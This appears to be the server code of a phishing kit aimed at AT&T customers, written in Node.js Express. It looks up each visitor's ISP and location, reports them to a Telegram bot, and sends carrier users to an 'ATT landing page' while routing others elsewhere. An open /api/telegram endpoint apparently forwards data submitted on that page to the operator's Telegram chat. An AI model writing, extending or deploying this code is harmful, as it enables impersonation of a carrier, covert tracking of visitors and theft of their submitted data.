const express = require('express');
const axios = require('axios');
const path = require('path');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

// IMPORTANT: Set these environment variables in your hosting provider
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ATT_LANDING_PAGE = process.env.ATT_LANDING_PAGE;
const NON_ATT_LANDING_PAGE = process.env.NON_ATT_LANDING_PAGE;
const MOBILE_ISPS = ['AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'US Cellular', 'Cricket', 'Metro', 'Boost', 'Xfinity', 'Charter Communications Inc', ' Comcast Cable Communications, LLC','Verizon Business','T-Mobile USA, Inc.'];

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || !ATT_LANDING_PAGE || !NON_ATT_LANDING_PAGE) {
    console.error('ERROR: All required environment variables (TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ATT_LANDING_PAGE, NON_ATT_LANDING_PAGE) must be set');
}

app.use(express.json());
app.use(cors()); // Enable CORS for all routes

// Main endpoint to determine redirect
app.get('/init', async (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
    
    let data = null;
    try {
        const response = await axios.get(`http://ip-api.com/json/${clientIp}`);
        data = response.data;
    } catch (error) {
        console.error('ISP lookup failed:', error.message);
    }

    // Send Telegram Notification
    let message = `🚀 *New App Visit!* \n\n`;
    if (data && data.status === 'success') {
        message += `📍 *IP:* ${data.query}\n` +
                   `🏢 *ISP:* ${data.isp || data.org || 'N/A'}\n` +
                   `🌍 *Location:* ${data.city}, ${data.regionName}, ${data.country}\n`;
    } else {
        message += `📍 *IP:* ${clientIp}\n⚠️ *ISP info unavailable*\n`;
    }
    message += `🕒 *Time:* ${new Date().toLocaleString()}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) {}

    // Determine Redirect URL
    let targetUrl = NON_ATT_LANDING_PAGE;
    if (data && data.status === 'success') {
        const userISP = (data.isp || data.org || "").toUpperCase();
        if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
            targetUrl = '/go-att';
        }
    }

    res.json({ redirect: targetUrl });
});

app.use(express.static('.')); // Serve index.html if needed

// Redirect to AT&T landing page
app.get('/go-att', (req, res) => {
    res.redirect(ATT_LANDING_PAGE);
});

app.post('/api/telegram', async (req, res) => {
    const { message } = req.body;
    
    if (!message) {
        return res.status(400).send('Message is required');
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        res.status(200).send('Message sent successfully');
    } catch (error) {
        console.error('Error sending message:', error.response?.data || error.message);
        res.status(500).send('Failed to send message');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
